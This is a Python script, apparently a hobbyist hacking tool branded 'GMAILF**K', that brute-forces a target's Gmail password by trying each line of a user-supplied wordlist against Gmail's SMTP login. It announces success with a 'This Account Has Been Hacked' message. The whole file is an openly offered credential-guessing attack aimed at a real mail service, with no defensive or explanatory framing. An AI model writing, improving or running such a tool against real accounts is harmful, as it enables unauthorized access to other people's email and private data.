#!/usr/bin/python
'''create by CyberAv3s'''

import smtplib
from os import system
from colorama import Fore

def main():
   print( Fore.YELLOW)
   print('                     ')
   print('          WELCOME TO GMAILF**K            ')
   print('                     ')
   print('                  /\   //\         ')
   print('                 / \  // \\               ')
   print('   |\___/|      /   \//  .\\           ')
   print('   /O  O  \__  /    //  | \ \       ')
   print('  /     /  \/_/    //   |  \  \      ')
   print('  @___@    \/_   //    |   \   \       ')
   print('             \/_ //     |    \  \       ')                           
   print('             //_      |     \    \       ')                                 
   print('            //         \     \_ _/        ')                                
   print('           /  |  /    \\\ ___/              ')                      
   print('          /   | /    \\\                   ')                                 
   print('         /    |/      \\\               ')                                
   print('         /             \_\            ')
   print('         /  |  /    \\\   \_       ')                                   
   print('         \  |  /    \\\   _\     ')
   print('          \ \/        / // /   ')
   print('           \_________/ ')
   print('             ------   ')
   print('              V1.0                        ')
   print('       Created by CyberAv3s               ')
   print('                                          ')
       
main()

print ('[1] start the attack')
print ('[2] exit')

option = input('==> ')
option = int(option)

if option == 1:
   file_path = input('path of passwords wordlist: ')
   pass_file = open(file_path,'r')
   password_list = pass_file.readlines()
else:
   system('clear')
   exit()


def login():
    i = 0
    user_name = input('target email :')
    server = smtplib.SMTP_SSL('smtp.gmail.com', 465)
    server.ehlo()
    for password in password_list:
      i = i + 1
      print (str(i) + '/' + str(len(password_list)))
      try:
         server.login(user_name, password)
         system('clear')
         main()
         print ('\n')
         print ('[+] This Account Has Been Hacked Password :' + password + '     ^_^')
         break
      except smtplib.SMTPAuthenticationError as e:
         error = str(e)
         if error[14] == '<':
            system('clear')
            main()
            print ('[+] this account has been hacked, password :' + password + '     ^_^')

            break
         else:
            print ('[!] password not found => ' + password)



login()

